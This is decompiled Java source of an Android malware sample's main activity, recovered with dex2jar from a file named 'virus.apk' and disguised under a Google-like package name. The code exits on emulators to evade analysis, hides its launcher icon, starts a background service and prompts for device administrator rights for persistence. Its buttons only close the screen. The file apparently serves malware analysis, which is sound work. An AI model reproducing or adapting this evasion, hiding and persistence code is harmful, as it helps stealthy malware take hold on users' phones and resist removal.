package com.example.google.service;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;

@SuppressLint({"DefaultLocale"})
public class MainActivity extends Activity
{
  private Button buttonCancel;
  private Button buttonOk;
  private View.OnClickListener listener = new View.OnClickListener()
  {
    public void onClick(View paramAnonymousView)
    {
      switch (((Button)paramAnonymousView).getId())
      {
      case 2131165185:
      case 2131165186:
      }
      MainActivity.this.finish();
    }
  };

  private void Hide()
  {
    if (getString(2131034116).equals("1"))
    {
      Intent localIntent = new Intent("android.intent.action.MAIN");
      localIntent.setFlags(268435456);
      localIntent.addCategory("android.intent.category.HOME");
      startActivity(localIntent);
    }
  }

  private void HideIcon()
  {
    getPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);
    setResult(1);
  }

  private void StartService()
  {
    Intent localIntent = new Intent();
    localIntent.setAction("com.example.google.service.Services");
    getApplicationContext().startService(localIntent);
  }

  private void addAdviceAdmin()
  {
    Intent localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
    localIntent.putExtra("android.app.extra.DEVICE_ADMIN", new ComponentName("com.example.google.service", "com.example.google.service.MyDeviceAdminReceiver"));
    startActivity(localIntent);
  }

  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    String str = Build.MODEL;
    if ((str.toLowerCase().indexOf("emulator") > -1) || (str.toLowerCase().indexOf("sdk") > -1))
      finish();
    setContentView(2130903040);
    StartService();
    this.buttonCancel = ((Button)findViewById(2131165186));
    this.buttonCancel.setOnClickListener(this.listener);
    this.buttonOk = ((Button)findViewById(2131165185));
    this.buttonOk.setOnClickListener(this.listener);
    HideIcon();
    addAdviceAdmin();
  }

  public void onStart()
  {
    super.onStart();
  }
}

/* Location:           F:\SDK\dex2jar-0.0.9.15\virus.apk_dex2jar.jar
 * Qualified Name:     com.example.google.service.MainActivity
 * JD-Core Version:    0.6.2
 */